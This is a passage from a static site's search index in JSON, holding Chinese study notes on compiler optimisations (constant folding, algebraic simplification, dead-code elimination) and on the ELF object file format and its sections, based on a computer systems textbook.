</ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_54","title":"\u524d\u7aef\u4f18\u5316","text":"<p>\u5373\u5728<code>\u62bd\u8c61\u8bed\u6cd5\u6811</code>\u4e0a\u8fdb\u884c\u4f18\u5316\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_55","title":"\u5e38\u91cf\u6298\u53e0","text":"<p>\u57fa\u672c\u601d\u60f3\uff1a\u5728\u7f16\u8bd1\u671f\u95f4\u8ba1\u7b97\u8868\u8fbe\u5f0f\u7684\u503c</p> <ul> <li>a = 3 + 5 ==&gt; a = 8</li> <li>if(true &amp;&amp; false)\u00b7\u00b7\u00b7 ==&gt; if(false)</li> </ul> <p>\u53ef\u4ee5\u5728\u6574\u5f62\u3001\u5e03\u5c14\u578b\u3001\u6d6e\u70b9\u578b\u7b49\u6570\u636e\u7c7b\u578b\u4e0a\u8fdb\u884c\u3002</p> <p>\u5e38\u91cf\u6298\u53e0\u5bb9\u6613\u5b9e\u73b0\u3001\u53ef\u4ee5\u5728\u8bed\u6cd5\u6811\u6216\u8005\u4e2d\u95f4\u8868\u793a\u4e0a\u8fdb\u884c\uff0c\u901a\u5e38\u88ab\u662f\u7ebf\u7a0b\u516c\u5171\u5b50\u51fd\u6570\u88ab\u5176\u4ed6\u4f18\u5316\u8c03\u7528\u3002</p> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5fc5\u987b\u5f88\u5c0f\u5fc3\u9075\u5b88\u8bed\u8a00\u7684\u5b9a\u4e49\uff0c\u4f8b\u5982\u8003\u8651\u6ea2\u51fa\u6216\u5f02\u5e38\uff0c<code>0xffffffff  + 1 ==&gt; 0</code>\uff0c\u8be5\u6709\u5316\u662f\u5426\u6b63\u786e\uff1f</p> <p>\u7b54\uff1a\u5982\u679c\u662f\u7b26\u53f7\u6570\uff0c\u5219\u6b63\u5e38\u8ba1\u7b97\u4e3a 0\uff0c\u82e5\u4e3a\u975e\u7b26\u53f7\u6570\uff0c\u5219\u6ea2\u51fa\uff0c\u867d\u7136\u6ea2\u51fa\u540e\u4e5f\u4e3a\u96f6\uff0c\u4f46\u6709\u4e9b\u8bed\u8a00\u8be5\u60c5\u51b5\u4e0b\u9700\u8981\u629b\u51fa\u5f02\u5e38\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_56","title":"\u4ee3\u6570\u5316\u7b80","text":"<p>\u57fa\u672c\u601d\u60f3\uff1a\u5229\u7528\u4ee3\u6570\u7cfb\u7edf\u7684\u6027\u8d28\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u5316\u7b80\u3002</p> <p>\u793a\u4f8b\uff1a</p> <ul> <li>a = 0 + b ==&gt; a = b</li> <li>a = 1*b ==&gt; a = b</li> <li>2*a ==&gt; a + a \uff08\u5f3a\u5ea6\u6d88\u5f31\uff09</li> <li>2*a ==&gt; a &lt;&lt; 1 \uff08\u5f3a\u5ea6\u6d88\u5f31\uff09</li> </ul> <p>\u5f3a\u5ea6\u6d88\u5f31\u6307\u7684\u662f\uff0c\u5728\u8ba1\u7b97\u65f6\uff0c<code>2*a</code>\u7684\u590d\u6742\u7a0b\u5ea6\u9ad8\u4e8e<code>a+a</code>\u6216<code>a&lt;&lt;1</code>\uff0c\u56e0\u6b64\u4f18\u5316\u540e\u53ef\u4ee5\u63d0\u9ad8\u6548\u7387\u3002</p> <p>\u540c\u65f6\u4e5f\u5fc5\u987b\u975e\u5e38\u4ed4\u7ec6\u7684\u5904\u7406\u8bed\u4e49\uff0c\u4f8b\u5982<code>(i-j) + (i-j) ==&gt; i+i-j-j</code>\u7684\u4f18\u5316\u5b58\u5728\u95ee\u9898\uff0c\u9700\u8981\u8003\u8651\u6ea2\u51fa\u7b49\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_57","title":"\u6b7b\u4ee3\u7801\uff08\u4e0d\u53ef\u5230\u8fbe\u4ee3\u7801\uff09\u5220\u9664","text":"<p>\u57fa\u672c\u601d\u60f3\uff1a\u9759\u6001\u79fb\u9664\u7a0b\u5e8f\u4e2d\u4e0d\u53ef\u5230\u8fbe\u7684\u4ee3\u7801</p> <p>\u793a\u4f8b\uff1a</p> <pre><code>if(false)\n  s1;\nelse s2;\n\n// \u4f18\u5316\u4e3a\ns2\uff1b\n</code></pre> <p>\u5728\u63a7\u5236\u6d41\u56fe\u4e0a\u4e5f\u53ef\u4ee5\u8fdb\u884c\u8fd9\u4e9b\u4f18\u5316\uff0c\u4f46\u5728\u65e9\u671f\u505a\u8fd9\u4e9b\u4f18\u5316\u53ef\u4ee5\u7b80\u5316\u4e2d\u540e\u6bb5\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_58","title":"\u4e2d\u671f\u4f18\u5316","text":"<p>\u5bf9\u4e2d\u95f4\u8868\u793a\u4e0a\u7684\u4ee3\u7801\u8fdb\u884c\u4f18\u5316\uff0c\u56e0\u6b64\u4f9d\u8d56\u4e8e\u5177\u4f53\u6240\u4f7f\u7528\u7684\u4e2d\u95f4\u8868\u793a\uff1a\u63a7\u5236\u6d41\u56fe\uff08CFG\uff09\u3001\u63a7\u5236\u4f9d\u8d56\u56fe\uff08CDG\uff09\u3001\u9759\u6001\u5355\u8d4b\u503c\u5f62\u5f0f\uff08SSA\uff09\u3001\u540e\u7eed\u4f20\u9012\u98ce\u683c\uff08CPS\uff09\u7b49\u3002</p> <p>\u5728\u8fdb\u884c\u4e2d\u671f\u4f18\u5316\u65f6\uff0c\u5f80\u5f80\u90fd\u9700\u8981\u7a0b\u5e8f\u5206\u6790\u3002\u5176\u4f18\u70b9\u662f\u5728\u5168\u5c40\u8fdb\u884c\u7684\uff0c\u800c\u4e0d\u662f\u5c40\u90e8\u3002\u901a\u7528\u7684\u6a21\u5f0f\u662f\uff1a\u7a0b\u5e8f\u5206\u6790 -&gt; \u7a0b\u5e8f\u91cd\u5199\u3002</p> <ul> <li> <p>\u5e38\u91cf\u4f20\u64ad</p> </li> <li> <p>\u62f7\u8d1d\u4f20\u64ad</p> </li> <li> <p>\u6b7b\u4ee3\u7801\u5220\u9664</p> </li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/","title":"\u6df1\u5165\u7406\u89e3\u8ba1\u7b97\u673a\u7cfb\u7edf","text":"<p>Quote</p> <p>2024.1.11 \u7855\u4e8c\u5e74\u7ea7\u4e8e\u6e05\u6c34\u6cb3\u5bdd\uff0c\u68b3\u7406\u8ba1\u7b97\u673a\u57fa\u7840</p> <p>\u2014\u2014 \u535a\u89c2\u800c\u7ea6\u53d6\uff0c\u539a\u79ef\u800c\u8584\u53d1</p> <p>\u6839\u636e\u300a\u6df1\u5165\u7406\u89e3\u8ba1\u7b97\u673a\u7cfb\u7edf\u300b\u7684\u7ec4\u7ec7\u987a\u5e8f\uff0c\u9996\u5148\u9700\u8981\u7406\u89e3 \u4fe1\u606f\u7684\u8868\u793a\u548c\u5904\u7406\uff0c\u5373\u5341\u516d\u8fdb\u5236\u3001\u6574\u6570\u3001\u6d6e\u70b9\u6570\u7684\u8868\u793a\u7b49\u4fe1\u606f\uff0c\u968f\u540e\u63cf\u8ff0\u4e86 \u7a0b\u5e8f\u7684\u673a\u5668\u7ea7\u8868\u793a\uff0c\u4ecb\u7ecd\u4e86 8086 \u4ee5\u53ca\u5176\u540e\u4ee3 X86\u3001x86-64 \u7684\u7531\u6765\uff0c\u5f15\u5165 \u4e8c\u8fdb\u5236\u548c\u6c47\u7f16\u4ee3\u7801\uff0c\u4ece\u5e95\u5c42\u89d2\u5ea6\u8bb2\u89e3\u7a0b\u5e8f\u6307\u4ee4\u7684\u6267\u884c\u3002</p> <p>\u63a5\u7740\uff0c\u5c06\u4ecb\u7ecd\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784\u548c\u5b58\u50a8\u5668\u5c42\u6b21\u7ed3\u6784\u3002</p> <p>\u6700\u540e\uff0c\u5173\u6ce8\u7a0b\u5e8f\u5728\u7cfb\u7edf\u4e0a\u7684\u8fd0\u884c\uff0c\u9996\u5148\u4ecb\u7ecd \u7f16\u8bd1\u3001\u94fe\u63a5\u53ca ELF \u6587\u4ef6\u683c\u5f0f\uff0c\u63a5\u7740\u8bb2\u89e3 \u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u7684\u52a0\u8f7d\u548c\u6267\u884c\u3002\u968f\u540e\u5c06\u5bf9 \u5f02\u5e38\u63a7\u5236\u6d41 \u8fdb\u884c\u4ecb\u7ecd\uff0c\u4e3b\u8981\u662f \u4e2d\u65ad\u548c\u7cfb\u7edf\u8c03\u7528\uff0c\u5e76\u5f15\u5165 \u8fdb\u7a0b \u7684\u6982\u5ff5\u3002\u5176\u6b21\uff0c\u4ecb\u7ecd \u865a\u62df\u5185\u5b58 \u53ca\u5176\u5206\u914d\u56de\u6536\u3002</p> <p>\u5f53\u7136\uff0c\u53ef\u80fd\u8fd8\u4f1a\u6d89\u53ca IO \u53ca \u5e76\u53d1 \u7684\u5185\u5bb9\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#elf","title":"\u76ee\u6807\u6587\u4ef6\u4e0e ELF","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#linux-elf","title":"Linux \u4e0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\uff1aELF","text":"<p>\u53c2\u8003\uff1a</p> <ul> <li>ELF \u6587\u4ef6\u683c\u5f0f\u89e3\u6790</li> <li>\u2b50\ufe0fCTF WIKI | ELF \u6587\u4ef6</li> </ul> <p>\u901a\u8fc7 <code>file</code> \u6307\u4ee4\u67e5\u770b\u6587\u4ef6\u7684\u683c\u5f0f\uff0c\u4ee5\u6b64\u5224\u65ad\u662f\u5426\u662f ELF \u683c\u5f0f\u7684\u6587\u4ef6\uff1a</p> <pre><code>file a.out\n</code></pre> <p>\u5728\u73b0\u5728 Linux/Unix \u7cfb\u7edf\u4e2d\uff0c\u4f7f\u7528\u53ef\u6267\u884c\u53ef\u94fe\u63a5\u683c\u5f0f\uff08ELF, Executable and Linkable Format\uff09 \u8868\u793a\u76ee\u6807\u6587\u4ef6\uff0c\u7c7b\u4f3c\u7684\uff0cWindows \u91c7\u7528\u53ef\u79fb\u690d\u53ef\u6267\u884c\uff08PE, Portable Executable\uff09\uff0cMac \u4f7f\u7528 Mach-O \u683c\u5f0f\u8868\u793a\u3002</p> <p>\u76ee\u6807\u6587\u4ef6\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e09\u79cd\u7c7b\u578b</p> <ul> <li>\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\uff08Relocatable File\uff09\uff1a\u5305\u542b\u4e8c\u8fdb\u5236\u4ee3\u7801\u548c\u6570\u636e\uff0c\u5176\u5f62\u5f0f\u53ef\u4ee5\u5728\u7f16\u8bd1\u65f6\u4e0e\u5176\u4ed6\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u5408\u5e76\u8d77\u6765\uff0c\u521b\u5efa\u4e00\u4e2a\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u3002Linux   \u7cfb\u7edf\u4e2d\u7684\u540e\u7f00\u4e3a <code>.o</code> \u3002</li> <li>\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\uff08Executable File\uff09\uff1a\u5305\u542b\u4e8c\u8fdb\u5236\u4ee3\u7801\u548c\u6570\u636e\uff0c\u5176\u5f62\u5f0f\u53ef\u4ee5\u88ab \u76f4\u63a5\u590d\u5236\u5230\u5185\u5b58\u5e76\u6267\u884c\u3002</li> <li>\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff08Shared Object File\uff09\uff1a\u4e00\u79cd \u7279\u6b8a\u7684\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6   \uff0c\u53ef\u4ee5\u5728\u52a0\u8f7d\u6216\u8005\u8fd0\u884c\u65f6\u88ab\u52a8\u6001\u7684\u52a0\u8f7d\u8fdb\u5185\u5b58\u5e76\u94fe\u63a5\u3002\u4e00\u822c\u79f0\u4e3a\u5e93\u6587\u4ef6\uff0c\u540e\u7f00\u4e3a <code>.so</code></li> </ul> <p>\u6839\u636e ELF \u7c7b\u578b\u7684\u4e0d\u540c\uff0c\u5176\u6587\u4ef6\u5185\u5305\u542b\u7684\u5185\u5bb9\u4e5f\u4e0d\u540c\uff0c\u4e3b\u8981\u5206\u4e3a\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u548c\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u4e24\u7c7b\uff1a</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_1","title":"\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6","text":"<p>\u56fe\u793a\u4e3a\u5178\u578b\u7684 ELF \u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u7684\u683c\u5f0f\uff1a</p> <p></p> <p>\u2460 ELF Header \uff1a</p> <ul> <li>\u4ee5 16 \u5b57\u8282\u7684\u5e8f\u5217\u5f00\u59cb\uff0c\u8be5\u5e8f\u5217\u63cf\u8ff0\u4e86\u751f\u6210\u8be5\u6587\u4ef6\u7684\u7cfb\u7edf\u7684\u5b57\u7684\u5927\u5c0f\u548c\u5b57\u8282\u987a\u5e8f\u3002</li> <li>\u5269\u4e0b\u7684\u90e8\u5206\u5305\u542b\u5e2e\u52a9\u94fe\u63a5\u5668\u8bed\u6cd5\u5206\u6790\u548c\u89e3\u91ca\u76ee\u6807\u6587\u4ef6\u7684\u4fe1\u606f\uff1a ELF \u5934\u7684\u5927\u5c0f\u3001\u76ee\u6807\u6587\u4ef6\u7684\u7c7b\u578b\uff08\u5982\u53ef\u91cd\u5b9a\u4f4d\u3001\u53ef\u6267\u884c\u6216\u8005\u5171\u4eab\u7684\uff09\u3001\u673a\u5668\u7c7b\u578b\uff08\u5982   x86-64\uff09\u3001\u8282\u5934\u90e8\u8868\uff08section header table\uff09\u7684\u6587\u4ef6\u504f\u79fb\uff0c\u4ee5\u53ca\u8282\u5934\u90e8\u8868\u4e2d\u6761\u76ee\u7684\u5927\u5c0f\u548c\u6570\u91cf\u3002</li> </ul> <p>\u2461 Section Header Table \uff1a\u4e0d\u540c\u8282\u7684\u4f4d\u7f6e\u548c\u5927\u5c0f\u662f\u7531\u8282\u5934\u90e8\u8868\u63cf\u8ff0\u7684\uff0c\u5176\u4e2d\u76ee\u6807\u6587\u4ef6\u4e2d\u6bcf\u4e2a\u8282\u90fd\u5728\u8282\u5934\u90e8\u8868\u4e2d\u6709\u4e00\u4e2a\u56fa\u5b9a\u5927\u5c0f\u7684 \u6761\u76ee\uff08entry\uff09\u3002</p> <p>\u2462 Section \uff1a\u5939\u5728 ELF \u5934\u548c\u8282\u5934\u90e8\u8868\u4e4b\u95f4\u7684\u90fd\u662f\u8282\uff0c\u4e00\u4e2a\u5178\u578b\u7684 ELF \u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u5305\u542b\u4e0b\u9762\u51e0\u4e2a\u8282\uff1a</p> <ul> <li> <p>.text\uff1a \u5df2\u7f16\u8bd1\u7a0b\u5e8f\u7684\u673a\u5668\u4ee3\u7801\u3002</p> </li> <li> <p>.rodata\uff1a \u53ea\u8bfb\u6570\u636e\uff0c\u6bd4\u5982 printf \u8bed\u53e5\u4e2d\u7684\u683c\u5f0f\u4e32\u548c\u5f00\u5173\u8bed\u53e5\u7684\u8df3\u8f6c\u8868\u3002</p> </li> <li> <p>.data\uff1a \u5df2\u521d\u59cb\u5316\u7684\u5168\u5c40\u548c\u9759\u6001 C \u53d8\u91cf\u3002\u5c40\u90e8 C \u53d8\u91cf\u5728\u8fd0\u884c\u65f6\u88ab\u4fdd\u5b58\u5728\u6808\u4e2d\uff0c\u65e2\u4e0d\u5c80\u73b0\u5728 .data \u8282\u4e2d\uff0c\u4e5f\u4e0d\u5c80\u73b0\u5728 .bss \u8282\u4e2d\u3002</p> </li> <li> <p>.bss\uff1a \u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u548c\u9759\u6001 C \u53d8\u91cf\uff0c\u4ee5\u53ca\u6240\u6709\u88ab\u521d\u59cb\u5316\u4e3a 0   \u7684\u5168\u5c40\u6216\u9759\u6001\u53d8\u91cf\u3002\u5728\u76ee\u6807\u6587\u4ef6\u4e2d\u8fd9\u4e2a\u8282\u4e0d\u5360\u636e\u5b9e\u9645\u7684\u7a7a\u95f4\uff0c\u5b83\u4ec5\u4ec5\u662f\u4e00\u4e2a\u5360\u4f4d\u7b26\u3002\u76ee\u6807\u6587\u4ef6\u683c\u5f0f\u533a\u5206\u5df2\u521d\u59cb\u5316\u548c\u672a\u521d\u59cb\u5316\u53d8\u91cf\u662f\u4e3a\u4e86\u7a7a\u95f4\u6548\u7387\uff1a\u5728\u76ee\u6807\u6587\u4ef6\u4e2d\uff0c\u672a\u521d\u59cb\u5316\u53d8\u91cf\u4e0d\u9700\u8981\u5360\u636e\u4efb\u4f55\u5b9e\u9645\u7684\u78c1\u76d8\u7a7a\u95f4\u3002\u8fd0\u884c\u65f6\uff0c\u5728\u5185\u5b58\u4e2d\u5206\u914d\u8fd9\u4e9b\u53d8\u91cf\uff0c\u521d\u59cb\u503c\u4e3a   0\u3002</p> </li> <li> <p>.symtab\uff1a \u4e00\u4e2a\u7b26\u53f7\u8868\uff0c\u5b83\u5b58\u653e\u5728\u7a0b\u5e8f\u4e2d\u5b9a\u4e49\u548c\u5f15\u7528\u7684\u51fd\u6570\u548c\u5168\u5c40\u53d8\u91cf\u7684\u4fe1\u606f\u3002\u4e00\u4e9b\u7a0b\u5e8f\u5458\u9519\u8bef\u5730\u8ba4\u4e3a\u5fc5\u987b\u901a\u8fc7 -g   \u9009\u9879\u6765\u7f16\u8bd1\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u624d\u80fd\u5f97\u5230\u7b26\u53f7\u8868\u4fe1\u606f\u3002\u5b9e\u9645\u4e0a\uff0c\u6bcf\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u5728 .symtab \u4e2d\u90fd\u6709\u4e00\u5f20\u7b26\u53f7\u8868\uff08\u9664\u975e\u7a0b\u5e8f\u5458\u7279\u610f\u7528 STRIP   \u547d\u4ee4\u53bb\u6389\u5b83\uff09\u3002\u7136\u800c\uff0c\u548c\u7f16\u8bd1\u5668\u4e2d\u7684\u7b26\u53f7\u8868\u4e0d\u540c\uff0c.symtab \u7b26\u53f7\u8868\u4e0d\u5305\u542b\u5c40\u90e8\u53d8\u91cf\u7684\u6761\u76ee\u3002</p> </li> <li> <p>.rel.text\uff1a \u4e00\u4e2a .text   \u8282\u4e2d\u4f4d\u7f6e\u7684\u5217\u8868\uff0c\u5f53\u94fe\u63a5\u5668\u628a\u8fd9\u4e2a\u76ee\u6807\u6587\u4ef6\u548c\u5176\u4ed6\u6587\u4ef6\u7ec4\u5408\u65f6\uff0c\u9700\u8981\u4fee\u6539\u8fd9\u4e9b\u4f4d\u7f6e\u3002\u4e00\u822c\u800c\u8a00\uff0c\u4efb\u4f55\u8c03\u7528\u5916\u90e8\u51fd\u6570\u6216\u8005\u5f15\u7528\u5168\u5c40\u53d8\u91cf\u7684\u6307\u4ee4\u90fd\u9700\u8981\u4fee\u6539\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u8c03\u7528\u672c\u5730\u51fd\u6570\u7684\u6307\u4ee4\u5219\u4e0d\u9700\u8981\u4fee\u6539\u3002\u6ce8\u610f\uff0c\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u4e2d\u5e76\u4e0d\u9700\u8981\u91cd\u5b9a\u4f4d\u4fe1\u606f\uff0c\u56e0\u6b64\u901a\u5e38\u7701\u7565\uff0c\u9664\u975e\u7528\u6237\u663e\u5f0f\u5730\u6307\u793a\u94fe\u63a5\u5668\u5305\u542b\u8fd9\u4e9b\u4fe1\u606f\u3002</p> </li> <li> <p>.rel.data\uff1a \u88ab\u6a21\u5757\u5f15\u7528\u6216\u5b9a\u4e49\u7684\u6240\u6709\u5168\u5c40\u53d8\u91cf\u7684\u91cd\u5b9a\u4f4d\u4fe1\u606f\u3002\u4e00\u822c\u800c\u8a00\uff0c\u4efb\u4f55\u5df2\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\uff0c\u5982\u679c\u5b83\u7684\u521d\u59cb\u503c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\u5730\u5740\u6216\u8005\u5916\u90e8\u5b9a\u4e49\u51fd\u6570\u7684\u5730\u5740\uff0c\u90fd\u9700\u8981\u88ab\u4fee\u6539\u3002</p> </li> <li> <p>.debug\uff1a \u4e00\u4e2a\u8c03\u8bd5\u7b26\u53f7\u8868\uff0c\u5176\u6761\u76ee\u662f\u7a0b\u5e8f\u4e2d\u5b9a\u4e49\u7684\u5c40\u90e8\u53d8\u91cf\u548c\u7c7b\u578b\u5b9a\u4e49\uff0c\u7a0b\u5e8f\u4e2d\u5b9a\u4e49\u548c\u5f15\u7528\u7684\u5168\u5c40\u53d8\u91cf\uff0c\u4ee5\u53ca\u539f\u59cb\u7684 C   \u6e90\u6587\u4ef6\u3002\u53ea\u6709\u4ee5 - g \u9009\u9879\u8c03\u7528\u7f16\u8bd1\u5668\u9a71\u52a8\u7a0b\u5e8f\u65f6\uff0c\u624d \u4f1a\u5f97\u5230\u8fd9\u5f20\u8868\u3002</p> </li> <li> <p>.line\uff1a \u539f\u59cb C \u6e90\u7a0b\u5e8f\u4e2d\u7684\u884c\u53f7\u548c .text \u8282\u4e2d\u673a\u5668\u6307\u4ee4\u4e4b\u95f4\u7684\u6620\u5c04\u3002\u53ea\u6709\u4ee5 -g \u9009\u9879\u8c03\u7528\u7f16\u8bd1\u5668\u9a71\u52a8\u7a0b\u5e8f\u65f6\uff0c\u624d\u4f1a\u5f97\u5230\u8fd9\u5f20\u8868\u3002</p> </li> <li> <p>.strtab\uff1a \u4e00\u4e2a\u5b57\u7b26\u4e32\u8868\uff0c\u5176\u5185\u5bb9\u5305\u62ec .symtab \u548c .debug \u8282\u4e2d\u7684\u7b26\u53f7\u8868\uff0c\u4ee5\u53ca\u8282\u5934\u90e8\u4e2d\u7684\u8282\u540d\u5b57\u3002\u5b57\u7b26\u4e32\u8868\u5c31\u662f\u4ee5 null   \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u5e8f\u5217\u3002</p> </li> </ul> <p>\u4e3a\u4ec0\u4e48\u672a\u521d\u59cb\u5316\u7684\u6570\u636e\u79f0\u4e3a .bss\uff1f</p> <p>\u7528\u672f\u8bed .bss \u6765\u8868\u793a\u672a\u521d\u59cb\u5316\u7684\u6570\u636e\u662f\u5f88\u666e\u904d\u7684\u3002\u5b83\u8d77\u59cb\u4e8e IBM 704 \u6c47\u7f16\u8bed\u8a00\uff08\u5927\u7ea6\u5728 1957 \u5e74\uff09\u4e2d\u201c\u5757\u5b58\u50a8\u5f00\u59cb\uff08Block Storage Start\uff09\u201d\u6307\u4ee4\u7684\u9996\u5b57\u6bcd\u7f29\u5199\uff0c\u5e76\u6cbf\u7528\u81f3\u4eca\u3002\u4e00\u79cd\u8bb0\u4f4f .data \u548c .bss \u8282\u4e4b\u95f4\u533a\u522b\u7684\u7b80\u5355\u65b9\u6cd5\u662f\u628a \u201cbss\u201d \u770b\u6210\u662f\u201c\u66f4\u597d\u5730\u8282\u7701\u7a7a\u95f4\uff08Better Save Space\uff09\u201d \u7684\u7f29\u5199\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_2","title":"\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6","text":"<p>\u94fe\u63a5\u5668\u5c06\u591a\u4e2a\u76ee\u6807\u6587\u4ef6\u5408\u5e76\u6210\u4e00\u4e2a\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u3002\u6211\u4eec\u7684\u793a\u4f8b C \u7a0b\u5e8f\uff0c\u5f00\u59cb\u65f6\u662f\u4e00\u7ec4 ASCII \u6587\u672c\u6587\u4ef6\uff0c\u73b0\u5728\u5df2\u7ecf\u88ab\u8f6c\u5316\u4e3a\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e14\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u5305\u542b\u52a0\u8f7d\u7a0b\u5e8f\u5230\u5185\u5b58\u5e76\u8fd0\u884c\u5b83\u6240\u9700\u7684\u6240\u6709\u4fe1\u606f\u3002</p> <p>\u5728\u4e8c\u8fdb\u5236\u76ee\u6807\u6587\u4ef6\u4e2d\uff0c\u591a\u4e2a\u8282\u53ef\u4ee5\u88ab\u770b\u505a\u4e00\u4e2a\u6bb5\uff0c\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u4e24\u79cd\u6bb5\uff0c\u540e\u7eed\u4f1a\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\uff1a</p> <ul> <li>Text\uff1a\u4ee3\u7801\u6bb5\uff0c\u5305\u542b ELF Header\u3001Program Header Table\u3001.init\u3001.text\u3001.rodata</li> <li>Data\uff1a\u6570\u636e\u6bb5\uff0c\u5305\u542b .data\u3001.bss</li> </ul> <p>\u56fe\u793a\u4e3a\u5178\u578b\u7684 ELF \u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u7684\u683c\u5f0f\uff1a</p> <p></p> <p>\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u7684\u683c\u5f0f\u7c7b\u4f3c\u4e8e\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u7684\u683c\u5f0f\u3002ELF \u5934\u63cf\u8ff0\u6587\u4ef6\u7684\u603b\u4f53\u683c\u5f0f\u3002\u5b83\u8fd8\u5305\u62ec\u7a0b\u5e8f\u7684 \u5165\u53e3\u70b9\uff08entry point\uff09\uff0c\u4e5f\u5c31\u662f\u5f53\u7a0b\u5e8f\u8fd0\u884c\u65f6\u8981\u6267\u884c\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u3002</p> <ul> <li>.text\u3001.rodata \u548c .data \u8282\u4e0e\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u8282\u662f\u76f8\u4f3c\u7684\uff0c\u9664\u4e86\u8fd9\u4e9b\u8282\u5df2\u7ecf\u88ab\u91cd\u5b9a\u4f4d\u5230\u5b83\u4eec\u6700\u7ec8\u7684\u8fd0\u884c\u65f6\u5185\u5b58\u5730\u5740\u4ee5\u5916\u3002</li> <li>.init \u8282\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5c0f\u51fd\u6570\uff0c\u53eb\u505a _init\uff0c\u7a0b\u5e8f\u7684\u521d\u59cb\u5316\u4ee3\u7801\u4f1a\u8c03\u7528\u5b83\u3002</li> <li>\u56e0\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u662f \u5b8c\u5168\u94fe\u63a5\u7684\uff08\u5df2\u88ab\u91cd\u5b9a\u4f4d\uff09\uff0c\u6240\u4ee5\u5b83\u4e0d\u518d\u9700\u8981 .rel \u8282\u3002</li> </ul> <p>ELF 